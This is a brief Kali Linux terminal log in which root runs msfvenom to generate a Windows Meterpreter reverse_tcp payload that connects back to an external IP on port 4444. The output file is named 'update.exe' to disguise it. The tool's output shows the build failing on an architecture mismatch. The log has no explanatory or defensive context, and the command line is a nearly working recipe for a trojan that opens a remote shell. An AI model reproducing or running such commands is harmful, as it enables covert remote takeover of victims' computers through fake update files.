# all
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp lhost=47.30.217.62 lport=4444 -f exe -a x64 >update.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload Error: The selected arch is incompatible with the payload root@kali:~# 
